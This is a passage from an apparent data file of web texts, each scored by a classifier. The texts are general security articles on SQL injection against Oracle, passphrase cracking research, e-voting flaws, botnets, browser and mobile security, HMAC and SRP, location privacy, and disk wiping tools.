        "text": "SQL Injection and Oracle, Part Two December 4, 2002[From SecurityFocus] SQL Injection is a way to attack the data in a database through a firewall protecting it. It is a method by which the parameters of a Web-based application are modified in order to change the SQL statements that are passed to a database to return data. For example, by adding a single quote (') to the parameters, it is possible to cause a second query to be executed with the first. SQL injection techniques are an increasingly dangerous threat to the security of information stored upon Oracle Databases. These techniques are being discussed with greater regularity on security mailing lists, forums, and at conferences. There have been many good papers written about SQL Injection and a few about the security of Oracle databases and software but not many that focus on SQL injection and Oracle software. This is the second part of a two-part article that will examine SQL injection attacks against Oracle databases. The first installment offered an overview of SQL injection and looked at how Oracle database applications are vulnerable to this attack, and looked at some examples. This segment will look at enumerating the privileges, detecting SQL injection attacks, and protecting against SQL injection. The complete article is available at http://online.securityfocus.com/infocus/1646.",
        "prob": "tensor([[2.3850e-06, 1.0000e+00]])"
    },
    {
        "text": "\"Hammered asinine requirements\": Now there’s a secure password - — 24 January, 2013 18:08 Youre best off forgetting your grammar lessons when it comes to creating passphrases, according to new research out of Carnegie Mellon University and MIT. The researchers say that using grammar good or bad can clue in hackers about the words in a multi-word password. And theyve built an algorithm as a proof-of-concept to show it (The team, led by software engineering Ph.D. student Ashwini Rao of CMUs Institute for Software Research, will present its research at the Association for Computing Machinerys Conference on Data and Application Security and Privacy on Feb. 20 in San Antonio.). The team tested its grammar-aware password cracking algorithm against 1,434 passwords containing 16 or more characters, and cracked 10% of the dataset via the algorithm. We should not blindly rely on the number of words or characters in a password as a measure of its security, Rao said, in a statement. The researchers say that while a password based on a phrase or short sentence can be easier for a user to remember, it also makes it simpler to crack because grammatical rules narrow word choices and structures (in other words, a passphrase with pronoun-verb-adjective-noun would be easier to crack than one made up of noun-verb-adjective). The researchers found that Hammered asinine requirements, for instance, is harder to crack than even the longer and seemingly clever Th3r3 can only b3 #1! Passwords in general have come under increasing fire by security pros, as some of the highest profile breaches (LinkedIn, Nvidia) have been the result of password compromises or resulted in passwords (including encrypted ones) being made public. Googles security team is looking into ways to avoid passwords altogether for logging into websites. Read more about wide area network in Network World's Wide Area Network section.",
        "prob": "tensor([[2.0369e-06, 1.0000e+00]])"
    },
    {
        "text": "WASHINGTON — A series of problems with electronic voting machines has raised fresh questions about election technology as newer computerized systems gain ground for the 2012 US election. As many as 25 percent of Americans are expected to use paperless electronic voting machines in the upcoming November elections, according to the Verified Voting Foundation, but confidence has been eroded by incidents showing vulnerabilities. The foundation, which seeks more reliable election systems, contends that voting machines in 11 states are all-electronic, with no paper systems for recounts, and that many other jurisdictions have some of these systems in place. Last year, Microsoft Research published a paper describing vulnerabilities to what had been described as \"fully verifiable\" direct recording electronic (DRE) systems in which a hacker can \"undetectably alter large numbers of votes.\" Separately, scientists at Argonne National Laboratory described a way to tamper with certain electronic voting machines by inserting a $10 component along with a $15 radio frequency device to alter vote results. Pamela Smith of the Verified Voting Foundation said these incidents highlight the fact \"that you can have insider challenges as well as outsider hacks. It points out that you have to be able to check the system.\" Election security and technology has been an issue in the United States since the 2000 president election marred by \"hanging chads\" in Florida that muddled the result. US laws enacted since then encourage the use of new technology including touch-screen ballots. But some critics say these can be vulnerable to hackers and that some lack a \"paper trail\" which could allow a recount in case of machine failure. \"We still have a number of states which do not have what I call resilient recountable systems,\" Smith said. \"If they do have problems they may not be able to recover from them. So we would like states to move to recoverable systems where they could do a recount if there were a problem.\" Last September, researchers led by Roger Johnston at the Argonne lab were able to change votes on the a ballot machine using about $25 worth of equipment, by inserting a device to manipulate touch screens by remote control \"We believe these 'man in the middle attacks' are possible on a wide variety of voting machines,\" with little technical expertise, Johnston said. In October, Microsoft Research released a paper describing a so-called \"trash attack\" which it said could be \"effective against the majority of fully verifiable election systems.\" It is known as a trash attack because it would allow a corrupt elections worker, for example, see a voter dumping a receipt on the way out from a polling station, and then modify the vote without detection, and with no way to verify the original vote. Microsoft also offered a technical fix for this weakness. Dan Wallach, a Rice University computer scientist, said little has changed since reports about vulnerabilities in voting machines began around 2007. \"Anybody trying to compromise them could have read all the public reports in 2007 and now, five years later, they've had lots of time to engineer attacks,\" Wallach said. Wallach said it is not clear if any elections have been compromised by computer intrusions: \"We don't know. If they were doing it and were doing it skillfully, we'd never know.\" Other countries have faced similar issues. The Netherlands scrapped electronic voting several years ago after a high-profile hacking incident. Ireland also abandoned the use of Dutch-made voting machines. Controversies have arisen over security of voting machines in India and several other countries. Richard Soudriette, president of the Colorado-based Center for Diplomacy and Democracy, said it was \"unfortunate that electronic voting systems have taken on such a negative connotation.\" \"I think it is entirely possible to build trustworthy and verifiable systems. But there has been so much negative publicity about electronic voting, I don't think it's going to make a revival.\" Charles Stewart, a political scientist at the Massachusetts Institute of Technology and faculty member of the Voting Technology Project of MIT and the California Institute of Technology, said he is \"more comfortable than most people\" with the new systems, while acknowledging that any system can be vulnerable. \"I trust my computer scientist friends when they tell me all the ways you can hack into the machines,\" he said. \"But I've yet to see an election hacked.\" Stewart that if the 2012 presidential race is a runaway, few will notice any flaws in vote technology. But if it is a tight race, \"I can easily imagine in a state like Ohio or Florida or Pennsylvania, if there are one or two counties where things go wrong, that could raise this issue again.\" Copyright © 2013 AFP. All rights reserved. More »",
        "prob": "tensor([[2.4763e-06, 1.0000e+00]])"
    },
    {
        "text": "More business transactions occur electronically every year, and organizations are retaining a growing volume of sensitive data. For many organizations, data has become an invaluable asset — the lifeblood of their operations. Access to this data is available to an expanding user base, including employees, business partners, suppliers and customers. IT infrastructures are more extensive, more complex, more distributed — and more accessible. This interconnectedness affords many benefits for businesses, government agencies and consumers alike — but it also potentially introduces a great deal of risk. The more access points an organization maintains, the greater the possibility of compromised systems or data theft. To help secure their data, companies have generally focused much of their efforts on protecting themselves from threats from outside of the organization. However, a growing wave of data losses caused by human error and fraud from within the organization illustrate the degree of risk to companies and government agencies. And the stakes are high — especially as repositories of private information expand. Growing public concern over the security and privacy of personal data has placed many companies and government agencies in the spotlight — and countries around the world are developing regulations designed to support confidentiality. In a recent global business security report, IBM identified a burgeoning trend toward small, targeted insider attacks — rather than sweeping global threats such as worms, spam, viruses and other malware. Insider attacks can be a significant threat to the security and privacy of data.",
        "prob": "tensor([[2.0701e-06, 1.0000e+00]])"
    },
    {
        "text": "For most people, the web browser is central to what you do on your computer. Companies are increasingly putting more and more services on the web and are encouraging their customers online. Securing your web browser is a vital part of surfing the web safely and keeping your computer free of viruses, spyware and other threats. Most people own a computer which runs Microsoft Windows XP or other variants of the Windows operating system. This means that by default most people use Microsoft’s Internet Explorer browser and therefore hackers focus their efforts on finding vulnerabilities in this program. The most important step you can take to securing your web browser is to make sure that the version you are using is the most current version and has all the latest patches or updates installed. Hackers exploit vulnerabilities in the software to steal personal information and take control of your computer. Make sure that automatic updates are switched on and that you immediately install any updates you are prompted to download. Given the well documented issues with Internet Explorer it is worth considering an alternative browser like Mozilla Firefox or the Opera Desktop Browser. You will still need Internet Explorer for some sites, however due to the increased popularity of the Firefox browser most sites now work with both Internet Explorer and Firefox as standard. Both alternatives pack some impressive features liked tabbed browsing which Microsoft is only just catching up on. Switching browser does not mean that you are 100% secure but there is currently a much reduced likelihood of being impacted by security issues. Regardless of what web browser you use a lot of information about your surfing habits is stored on your computer. Common items include the URLs or web pages you visit, files which have been downloaded, “Cookie” files which websites put on your computer and parts of the web pages you have viewed. It is therefore good practice to scrub this information on a regular basis. You can do this manually through your browser’s Options menu or use a free software tool like CCleaner which is highly recommended. The good news is that the computer security industry is developing some great new products and services to help you protect yourself online. There appears to be an increasing emphasis on developing tools which help prevent your computer being infected in the first place. A good example of this is a web browser plug-in called “SiteAdvisor” which was recently bought by McAfee. SiteAdvisor gives each website it visits a red, yellow or green rating based on various tests it carries out. These ratings then conveniently appear next to search results in Google and other search engines. This helps users determine whether a website is safe to visit. Anti-spyware tools like Webroot’s Spy Sweeper and PC Tools’ Spyware Doctor also include sophisticated active protection features as standard. Richard Rogers runs a number of computer-related sites offering Spyware Remover and Anti Virus Software help. Article Source: http://EzineArticles.com/?expert=Richard_Rogers",
        "prob": "tensor([[2.5128e-05, 9.9997e-01]])"
    },
    {
        "text": "More than 300 Web sites are being pestered by infected computers that are part of the Pushdo botnet, according to security researchers. The U.S. Federal Bureau of Investigation, Twitter and PayPal are among the sites being hit, although it doesn't appear the attacks are designed to knock the sites offline, said Steven Adair, of The Shadowserver Foundation, a group that tracks botnets. Shadowserver was tipped off to the Pushdo issue by Joe Stewart, director of malware analysis at vendor SecureWorks Inc. Pushdo, which is also known as Pandex or Cutwail, has been around for about three years, according to a report from Trend Micro Inc. (OTC:TMICY). Computers infected with Pushdo are used to send out spam, but the malware is capable of downloading other harmful code to a computer. Pusho appears to have been recently updated to cause computers infected with it to make SSL (Secure Sockets Layer) connections to various Web sites. SSL is an encrypted protocol used to protect information exchanged. The bots start to create an SSL connection and then disconnect, a process that is repeated, Adair said. Serving up SSL connections puts more of a burden on a Web site than HTTP connections, Adair said, but the traffic has been so sporadic that some large Web sites didn't even notice. \"Despite how noisy it is, the traffic is still too infrequent and not large enough to really be seen as what we would think is an intentional DDOS attack,\" Adair said in an e-mail exchange. \"Much smaller botnets are capable of generating far more traffic and causing more of an impact to Web sites than what is being done with Pushdo.\" The traffic, however, is significant and results in large Web sites getting millions of hits across hundreds of thousands of IP (Internet Protocol) addresses. \"This might be a big deal if you're used to only getting a few hundred or thousands of hits a day or you don't have unlimited bandwidth,\" Adair wrote on Shadowserver's blog. One option for Web sites is to change their IP addresses, but that may only be a temporary fix. \"We have also had numerous people write in offering assistance and feedback on ways to slow or stop these attacks,\" Adair said. \"We hope to put out an updated post that can help our system administrators associated with these Web sites soon.\"",
        "prob": "tensor([[2.1316e-06, 1.0000e+00]])"
    },
    {
        "text": "McKinsey & Company released a report last year titled BigData: TheNextFrontierforInnovation, Competition, andProductivity. One of the conclusions in this often-quoted analysis is that Government has the potential to see a larger benefit from the use of Big Data than any other economic sector except Finance and Insurance. In part 1a of this blog, I’ll address, at a very high level, what makes Big Data different from the data of ten years ago and why Big Data solutions unlock new approaches to turning data into information and information into knowledge that can be acted upon. In part 1b, I’ll offer practical examples of how government can leverage the Big Data techniques being aggressively exploited in the commercial world. In Part Two, we’ll take a look at the technology stack for Big Data, frequently referred to as the SMAQ stack: Storage, MapReduce and Query. I will also answer the question that you’ve wanted to ask: Why is Pig Latin the key to the SMAQ stack? In Part Three, we’ll cover the array of Big Data products and services that DLT Solutions offers in partnership with Oracle, RedHat, NetApp, QuestSoftware, Google, Informatica, Quantum, SoleraNetworks, and Amazon. Big Data GPS products from our vendor partner TomTom will be covered in Part 1. What is Big Data and how is it different from my data? Although there is no ‘industry standard’ definition for Big Data, it is generally referred to as data that has one or more of the following characteristics that contrast with the data you typically use: Volume – multiple terabytes or petabytes. Velocity – streaming input from ‘always on’ sensors, continuous video feeds, and social media sources like Twitter or Facebook. Variety – multiple file types, unstructured text in a wide range of formats from a range of sources, structured data from databases and spreadsheets mixed with unstructured data. With the exception of government agencies involved in intelligence collection or major science projects, few have had to solve Big Data problems. However, Google and Yahoo have approached the problem from non-traditional perspectives and developed parallel processing techniques that can be employed on computing grids locally or in the Cloud. Open source software for these techniques have been formalized and brought to market by companies such as Cloudera and Hortonworks . Additionally, in the past 2-3 years, many major software brands have specialized in addressing one or more aspects of Big Data solutions. Selection of components for your Big Data solution, however, will include several issues that you would not normally address in selecting a specific Relational Database Management System RDBMS. More about that in part two. What is the value of Big Data? Big Data solutions are all about identifying valuable information in large datasets of varying quality. Big Data techniques do well at detecting information in low signal-to-noise ratio environments. One analyst’s noise may be another analyst’s gold nugget. For example, if an agency maintains for internal dissemination only the (unstructured) news articles about itself, the agency may miss learning of relevant, innovative solutions developed by a state agency or foreign government agency working on a closely related problem. Since the information sought by any one analyst today may be very different from that sought by another analyst in a month’s time, inexpensive Big Data storage solutions enable the enterprise to keep all data versus only the subset initially perceived to have value. And it’s not just about storing and searching large amounts of static data. Mining streaming social media for real-time information on disease outbreaks, for example, can provide critical public health data that may save lives. Now that I’ve summarized the basic Big Data concepts, part 1b will take a close look at some ways that Big Data might be exploited in the public sector. Share this article!",
        "prob": "tensor([[2.0881e-06, 1.0000e+00]])"
    },
    {
        "text": "Well, security should be no different. To build secure mobile apps, there are certain things that we're just going to have to do, and darn near every single time we write code. So, what security goodies are in your bag of tricks? Here's some food for thought on some things you might find useful, in no particular order: - Protecting secrets at rest -- Inevitably, we need to protect some data locally on the mobile device. Of course, the principles of sound design should guide us to minimize the data we store locally on the device. Some argue that we shouldn't really store anything of value locally, but our users don't always share that view. So we need to protect data locally: usernames (a la remember me button), passwords (best avoided, but for some consumer grade apps, it's acceptable), session tokens, customer names, and on and on. We need a reliable set of tools that help us protect things locally. Both iOS and Android give us some ability to do that, but for times when we cannot rely on the OS, we need more. SQLcipher is one such example. It's an open source extension of SQLite that does AES-256 using the venerable OpenSSL library, and it works on Android and iOS. - Protecting secrets in transit -- Of course, any modern OS and app can do SSL encryption, but things aren't always that simple. Sometimes we want to more strongly verify the SSL certificates on both ends of the connection. Sometimes we want to encrypt data that doesn't play nicely with TCP connections, like Voice over IP data that is best suited for UDP. - Server connections -- We often need to connect to different types of back-end services, and of course those connections need to be established securely. At a network layer, we can use SSL, like I've described above, but at a data layer, we also need to ensure our connection is strong. For example, if we're connecting to an SQL database of some sort, we need to ensure our SQL API is immutable, and not subject to SQL injection and such. - Authentication -- We need strong mutual authentication among all of our application components, of course, but we also need to authenticate users and any other entities our app interacts with. We can use x.509 certificates in some cases. Other times we need to use simple username/password combinations. Either way, though, the authentication needs to be mutual and worthy of trust. We have to avoid mistakes like hard coding credentials into our code. - Authorization -- Once a user or entity is identified and authenticated, we then need to ensure that it is able to get to all the data and resources it needs, of course. But we also need to ensure that it is not able to get to data and resources that it doesn't need -- that it's not authorized to access. That means we need to weave access control throughout our system, and it needs to be consistently applied across our architecture. - Input validation -- All data entering our application, through whatever input source possible, needs to be validated. For example, if we're expecting a credit card number, then our code should validate that a credit card number has indeed been input, and nothing other than a credit card number. That's called input validation, and it's vital we get it right. Input validation problems lead to cross site scripting and a myriad of other security problems, after all. But there are many decisions to make, like where do we perform input validation? Our design time choices can have vast impacts on our application's ability to perform its given tasks securely. - Output escaping --",
        "prob": "tensor([[2.0746e-06, 1.0000e+00]])"
    },
    {
        "text": "Strictly speaking, the use of the term \"signature\" about HMAC is improper; it is widespread, but still incorrect: signatures are about asymmetric algorithms with a public and a private key, such as RSA. HMAC uses a secret key (i.e. a bunch of arbitrary bytes) which is used for computing the MAC and for verifying it (it is actually verified by recomputing it). So, in your problem, yes, the server must store either the secret key, or some data which is enough to recover it. Note that the secret key K can be derived from the password in a non-invertible way. E.g. through a hash function or, better yet, with a Key Derivation Function. The server will store the key K \"in plaintext\" and knowing key K is enough to produce valid HMAC values. However, this forces an attacker to use some specific software for that, not the standard client which requests a user password. Depending on the context and your attack model, this may or may not be a security improvement. A way to achieve what you are looking for, but with higher complexity then a plain HMAC, is to use SRP. SRP is an asymmetric key exchange protocol with mutual password-based authentication, with the following characteristics: - No need for public key distribution (PKI, certificates...). - Client authenticates server and server authenticates client, in the same pass, even in the presence of active attackers (\"Man-In-The-Middle\" attackers are defeated). - No active or passive attackers learns enough information to perform offline dictionary attacks (a dictionary attack is guessing the password by trying random words; the attack is offline if it can be done without interacting with the honest client or server for each guess). - What the server stores is not enough to learn the password or impersonate the client (but it allows offline dictionary attacks, which is unavoidable). The key which results from the SRP protocol can then be used for a MAC algorithm such as HMAC. It needs not be stored: it is just kept in RAM for the duration of the session. SRP can be integrated in TLS, as explained in RFC 5054. The easiest, most standard supported way to use SRP in your context would be to use HTTPS (i.e. HTTP within a SSL/TLS tunnel) with the TLS part using SRP for key exchange. GnuTLS is an opensource implementation of SSL/TLS which supports SRP.",
        "prob": "tensor([[7.5264e-06, 9.9999e-01]])"
    },
    {
        "text": "Not only are there multiple agendas at play, given that hardware needs one thing, operating systems something else, app developers something different again. On top of that we have multiple platforms to think about, besides the fact that technology is changing fast: new apps are coming out on different platforms on a daily basis and we’re rapidly moving towards a location-aware world where everything around us is coming to life not just in front of our eyes, but on our devices too. So what to do or can be done? Making use of location datatouches upon delicate privacy issues, since it enables verifying someone‘s location without the person's consent. Strict ethics and security measures are strongly recommended for services that employ positioning, and the user should be giving an informed, explicit consent to a service provider before positioning data from the user's mobile phone can be computed. In Europe, where most countries have a constitutional guarantee on the secrecy of correspondence, location data obtained from mobile phone networks is usually given the same protection as communication itself. The United States, however, has no explicit constitutional guarantee on the privacy of telecommunications, so use of location data is limited by law. In Germany, even obviously criminal intent may not be inferred by such means, although technically possible. Officially, only authorities (like the police) can obtain permission to position phones in emergency cases, in contrast to the current U.S laws that allow tracking suspects – even access a mobile phone's internal microphone to eavesdrop on local conversations while the phone is switched off. By the way, this is a technology that China proposed to use to track commuting patterns of Beijing city residents. One implication of LBS is that data about a subscriber's location and historical movements should be owned and controlled by the network operators, including mobile carriers and mobile content providers. Beside the solution of a legal framework several technical approaches to protect privacy exist, using privacy-enhancing technologies (PETs), such as basic on/off switches to sophisticated anonymization techniques, which are e.g. offered by Google Latitude. Another set of techniques included in the PETs are the location obfuscation techniques, which slightly alter the location of the users in order to hide their real location while still being able to represent their position and receive services from their LBS provider. Fact is that smartphone devices tend to go with their owners wherever they are and increasingly becoming a payment device, too. But why should smartphone users make use of a trackable black box that makes them feel uncomfortable due to security and location-tracking issues inherent in such transactions? To give the development of the mobile payment industry a push forward, we definitely have to find a good answer to the question. Debates sparked last year after monitoring software installed on millions of smartphones had been discovered. In the US the proposal was triggered that carriers and phone makers must inform consumers about the presence of monitoring software and gain their \"express consent\" before collecting and transmitting information from phones. Although all manufacturers say that this software is used only as a diagnostics tool to improve network and service performance, congressmen started denouncing the use of it and class-action lawsuits were filed, followed by a draft legislation that would require disclosure of monitoring software when a consumer buys a mobile phone. This legislation would in addition prevent manufacturers from collecting and transmitting information unless consumer consent is obtained, and would outline security policies companies would have to follow when receiving personal information from smartphones. A combination of appropriate technology, education and an opt-in processes, making sure that companies get explicit consent from users in order to share their location data, is probably the best solution. On top it can’t hurt to reconsider what level of privacy is actually needed and desired by users, don’t you think? By Daniela La Marca",
        "prob": "tensor([[0.0011, 0.9989]])"
    },
    {
        "text": "A zombie machine is a computer connected to the Internet that has been successfully attacked by a computer virus, worm, or Trojan horse. A hacker will compromise thousands of such machines to create a “Zombie Army” or a “BotNet.” With this network he can then launch spam attacks, attack Web sites, conduct phishing attacks, spread computer viruses, launch DoS attacks, download pornography, or steal personal information. By using zombie machines, spammers can hide the source of spam and hackers can hide the source of malicious content. Using zombie machines also provides hackers with extra bandwidth at the expense of the owner of the machine. Most owners of zombie machines are unaware that their machine is being used to launch such attacks. It is difficult to check whether your PC is a zombie, but some symptoms are a suddenly slow broadband connection, an unresponsive mouse or keyboard, excessive hard drive activity, or bounce notifications from people you’ve never tried to contact. Delete suspicious emails with attachments: Attachments are the main way malware gets onto your computer. Attachments include office document files (e.g., with .doc or .xls suffixes), program files (e.g., with .exe or .bat suffixes), and compressed files (e.g., with .zip suffixes), all of which can contain malware. The CERT Coordination Center advises users to apply the so-called \"KRESV\" test to detect suspicious emails. KRESV stands for: - Know: Do you know the sender? - Received: Have you received email from the sender before? - Expect: Are you expecting the e-mail? - Sense: Do the subject header and attachment name make sense? - Virus: Does it contain a virus? You will need antivirus software to check this. If an email with attachments fails any of these tests, delete it. If you know the sender, contact him or her to make sure that the message is legitimate. Install security patches: New security problems are constantly being found in software that has already been released. Software vendors therefore make updates or security \"patches\" available from time to time that fix these problems. A patch is a downloadable piece of software that repairs a security problem or other \"hole\" in the software. Since most intruders exploit these known weaknesses, failing to download a patch creates an unnecessary risk. The unpatched hole could serve as an entry point for hackers who want to examine, damage, or exploit the information and services on your computer. Perform frequent backups: Save your important data on a regular basis so that you can recover from a malware attack or intrusion. Thumb drives, CDs, and DVDs are good storage and transport media for large amounts of data. If possible, store your backup media in different location from the computer itself to keep them from both being destroyed in a fire or other disaster. Anti-virus software: The popularity of the Microsoft Windows operating system makes it a prime target for hackers and other virus writers, so anti-virus software is crucial for users of this system. Anti-virus software works by identifying files that match definitions of known viruses and keeping them from infecting the system. Make sure that your virus definitions are kept up to date by automatically or manually downloading them from your software manufacturer's Web site. Do not install more than one anti-virus program because incompatibility issues between the programs may end up leaving your system unprotected. Two popular anti-virus packages are Symantec’s Norton AntiVirus and McAfee AntiVirus . AVG , AntiVir and ClamWin are free alternatives. The major anti-virus programs, such as Symantec and McAfee, can protect against worms and Trojan horses as well as viruses. PDA and mobile phone anti-virus applications normally interact with the full version on a PC and hold fewer virus definitions. New virus updates are automatically transferred from your desktop computer each time you synchronize your PDA. Therefore it is important to keep your desktop computer's anti-virus software updated and synchronize your PDA regularly. Some commonly used anti-virus packages are Trend Micro's PC-cillin for Wireless and Symantec AntiVirus for Windows Mobile . Firewall: A firewall is like a security guard for your computer that monitors the traffic into and out of your computer. A firewall is your first line of defense against intrusions, especially Trojan horses. One popular firewall is Symantec's Norton Personal Firewall . The Windows operating systems such as Windows XP and Windows Vista include a firewall that is turned on automatically. This built-in firewall is described in more detail on the Microsoft site .",
        "prob": "tensor([[2.0294e-06, 1.0000e+00]])"
    },
    {
        "text": "Data Removal Recommendations For the general user, the delete or format command appears to be the logical method of removing unwanted data files. These methods, however, are like sweeping something under the carpet: you may not be able to see it, but it's still there. All that deletion has done is remove the pointer to the files, with the data itself residing in unallocated space on the hard drive. This means that data recovery is possible using various software tools. When sensitive information is stored on the hard drive of a machine that is to be surplussed or transferred to another individual or department, it is therefore imperative that extra measures be taken to wipe clean the hard drive before the computer leaves your area of responsibility. This document describes some common methods and software to assist you with the sanitization process. It also includes links to articles that provide detailed technical descriptions of what occurs during this process. 2.0 Sanitizing Techniques As described in the much-referenced article Remembrance of Data Passed: A Study of Disk Sanitization Practices, the three most common techniques for properly sanitizing hard drives are: 1. Physically destroying the drive, rendering it unusable. This is a good alternative for defective hard drives or those that would be too costly to repair. For added security, the disk should be overwritten or degaussed prior to destruction. 2. Degaussing the drive to randomize the magnetic domains – most likely rendering the drive unusable in the process. Degaussing, or demagnetizing, applies a reverse magnetizing field to data stored on magnetic media, erasing the contents by returning the magnetic flux to a zero state. 3. Overwriting the drive's data so that it cannot be recovered. Overwriting replaces previously stored data on a drive or disk with a predetermined pattern of meaningless information, rendering the data unrecoverable. The SANS white paper \"Deleting Sensitive Information: Why hitting delete isn't enough\"1 explains: \"...Overwriting data once is not usually good enough to prevent data recovery, instead it is recommended that a minimum of three passes are made writing alternating zero and one patterns over the data and then further passes with random data, the more passes the better the chance that no data can ever be recovered.\" NOTE: When removing sensitive information, don't forget storage devices such as thumbdrives, back-up external hardrives and CDs. Also, be sure to erase any stored names and numbers from phones and fax machines. 3.0 Suggested Software The following chart is a collection of disk wiping software recommended by departmental computing coordinators (DCCs) or listed on a variety of other University and security sites. The inclusion of any title does not indicate an endorsement by Brown University or the CIS department, and has only been provided as an aide in making a decision that best matches your specific needs. |Darik's Boot and Nuke (DBAN) ||Shareware||Windows 7, Vista & XP|| Self-contained boot disk that automatically deletes the contents of any hard disk that it can detect; prevents all known techniques of hard disk forensic analysis. Designed for consumer use. Professional data erasure tools are recommended for company and organizational users. (It does not provide users with a proof of erasure, such as an audit-ready erasure report.) |Disk Utility||Free||Mac OS X||Securely erases data as well as disk’s empty space (latter prevents the recovery of erased files without erasing the entire disk)| |DTI Disk Wipe ||$49.00||Windows 7, Vista & XP||Permanently erases and destroys all existing data on a hard disk| |East-Tec Eraser 2013||$39.95||Windows 8, 7, Vista & XP||Exceeds DoD standards; for the permanent erasure of digital info, including confidential documents, evidence of online activities. Also can be used to erase online activity and clean out browsers.| |East-Tec DisposeSecure 5||$19.95 (1 sanitization and 1 year of updates and support)|| For computer to create boot disk: Windows 7, Vista & XP |Designed to remove all traces of data from hard disk, overwriting all data from every sector| ||Free (shareware)||Windows 7, Vista & XP||Completely removes sensitive data from a hard drive by overwriting it several times with carefully selected patterns| ||Free version, Pro versions start at $39.95|| For computer to create boot disk: Windows 8, 7, Vista & XP |Powerful and compact software allowing you to destroy all data on hard disks, USB drives and floppy disks completely, excluding any possibility of future recovery of deleted files and folders; a hard drive and partition eraser utility| |Linux||Free||Linux||Use built-in dd, wipe and shred tools| ||$49.99||Windows 7, Vista & XP|| Includes Disk Cleaner (with \"bleach\" feature) to permanently erase all unwanted files |Paragon Disk Wiper |Windows 7, Vista & XP||Disk Wiper Pro meets DoD sanitizing standards; includes 10 different disk sanitization methods| |sDelete||Free (Microsoft utility)||Windows 7, Vista & XP||Securely overwrite your sensitive files and cleanse your free space of previously deleted files using this DoD-compliant secure delete program.| |ShredIt||Free trial, $24.95 (download version)||Windows 7, Vista & XP, Mac OS X or earlier||Easy interface, configurable overwrite pattern and number of overwrites| ||Shareware||Linux, Unix||Uses Gutmann's erase patterns, erasing single files and accompanying metadata or entire disks| |WipeDrive / WipeDrive with System Saver ||$19.95 / $39.95||Bootable PC disk, for all Windows and Mac computers||DoD approved; securely erases IDE and SCSI drives; unlimited wiping of 5 unique hard drives| 4.0 Removal Tips Each of the software products listed above comes with specific instructions, some with an easy-to-use wizard interface. KillDisk (recommended by some DCCs) is the software of choice at Northern Illinois University. Their support for this product includes detailed instructions on its use. Dell offers an overview document Erasing Data from Your Hard Drive and a link to CNET's (download.com) listing of rated disk wiping software. In addition to the software offered above, Mac computer hard drives can be cleared by zeroing their data. Note that zeroing data (aka \"low level\" format) may take a long time and depends on the hard disk size. It is recommended to use the \"8-way random\" feature in conjunction with the \"zero all data\" option. - Mac OS X: How to Zero All Data on a Disk (http://support.apple.com/kb/HT1820) - Mac OS X Disk Utility 12.x: Erase a Disk, CD or DVD (http://support.apple.com/kb/PH5849) 4.3 Unix / Linux / Solaris 5.0 Related Links Compendium of disk wiping software: - Darik's Boot and Nuke (DBAN): sourceforge.net/projects/dban/ - Disk Utility: support.apple.com/kb/PH5849 - DTI Disk Wipe: dtidata.com/products_disk_wipe.asp - East-Tec Eraser 2013: east-tec.com/eraser/ - East-Tec DisposeSecure 5: east-tec.com/disposesecure/ - Eraser: eraser.heidi.ie/ - KillDisk (Active@KillDisk): killdisk.com/ - Linux: linux.com/learn/tutorials/442455-wiping-your-disk-drive-clean - Norton Utilities: us.norton.com/norton-utilities/ - Paragon Disk Wiper: disk-wiper.com/ - sDelete: technet.microsoft.com/en-us/sysinternals/bb897443.aspx - ShredIt: mireth.com/shredit.html - Wipe: sourceforge.net/projects/wipe/ - WipeDrive: whitecanyon.com/wipedrive-erase-hard-drive.php - Securely Disposing of Computers and Other Storage Devices by Rob Lee, SANS' OUCH! newsletter (January 2011) - Sanitizing Media (The Linux Method) by Hal Pomeranz, SANS Computer Forensics blog (June 2010) - Precautions When Selling, Trading, or Sending a PC to Salvage or to a Repair Shop by H. D. Knoble, Penn State (May 2007) - Special Publication 800-88: Guidelines for Media Sanitization by the National Institute of Standards and Technology, NIST (September 2006) - Secure File Deletion, Fact or Fiction? by John R. Mallery, SANS Institute (June 2006) - Remembrance of Data Passed: A Study of Disk Sanitization Practices by Simson L. Garfinkel and Abhi Shelat, MIT, IEEE Computer Society, Security & Privacy, vol. 1, no. 1 (2003) - 1 Deleting Sensitive Information:Why Hitting Delete Isn't Enough by Hans Zetterstrom (2002) - What You Don't See On Your Hard Drive by Brian Kuepper, SANS Institute (April 2002) - Securely Deleting Files by John Kinney, SANS Institute (2002) Related sites at other universities: - Carnegie Mellon: Data Sanitization and Disposal Tools - Indiana University Information Security Office: Securely Removing Data - Michigan State University: How to Sanitize Data for Disposal - Stanford University: Disk and Data Sanitization Policy and Guidelines - Syracuse University: Data Sanitizing Policies - Univ. of Minnesota OIT Security: Destroying Data - Univ. of Pennsylvania Information Security: Computer Recycling and Disposal Options | Cleaning Out Old Computers Internally Reviewed and Updated: February 27, 2013",
        "prob": "tensor([[0.0154, 0.9846]])"
    },
    {
        "text": "Bot is a contraction of the word ‘robot’. These are small programs that are inserted on computers by attackers to allow them to control the system remotely without the user’s consent or knowledge. Botnets are groups of computers infected by bots and controlled remotely by the owner of the bots – known as the bot herder. This person can then send commands which include updating the bot, downloading a new threat, displaying advertising, sending spam or launching denial of service attacks. The compromised computer is known as a zombie. Some botnets can have tens of thousands of zombies under their control. The following image illustrates how botnets operate: Here, you can also see a video describing how the botnets work: Email scams are designed to defraud users, often using the lure of large windfalls or lottery wins but which require a sum of money to be paid in advance. They are really a type of hoax used maliciously for financial gain. Perhaps one of the best-known email scams is the Nigerian letter scam and its many variants. The initial email tries to convince recipients that there are several million dollars which cannot legally leave Nigeria (or wherever) unless transferred to a foreign account. The fraudsters offer a commission to the recipient of the email for helping them get the money out of the country, but ask for an advanced fee from the intended victim (under a myriad pretexts depending on the particular variation of the scam). However, the whole operation is a fraud. Many users have fallen victim to another type of scam which uses catastrophes as a bait, like the Katrina, which devastated New Orleans in 2005, or the tsunami that devastated South-East Asia in 2004. This involves emails asking users to donate money to help the victims of the catatrophes. Needless to say, the victims will not see a penny of any money sent by recipients of the email. Spyware programs are applications that compile information about a person or organization without their consent or knowledge. These programs normally steal data about users which could be used for advertising or for other financial gain. The type of information stolen by these programs varies considerably: email login details, IP and DNS addresses of the computer, or users’ Internet habits, among others. Spy programs are created by cyber-crooks, who sell them on the black market to be used in online fraud and other cyber-crime. Spyware is installed on computers without the user’s knowledge. It can be installed when downloading certain content from the Web or from P2P networks, when installing freeware, or simply when visiting dubious websites. Generally, these spy programs are installed when the user agrees to install other applications, which unbeknown to users, include a caveat in the legal agreement whereby users agree to install the spyware. There is some controversy surrounding what is actually spyware, as some people consider adware or even some toolbars to be variations of spyware. While this may be true to a certain extent, adware programs, as such, are not used with criminal intent, but to advertise products and services. How can you protect yourself? It is very important to have an 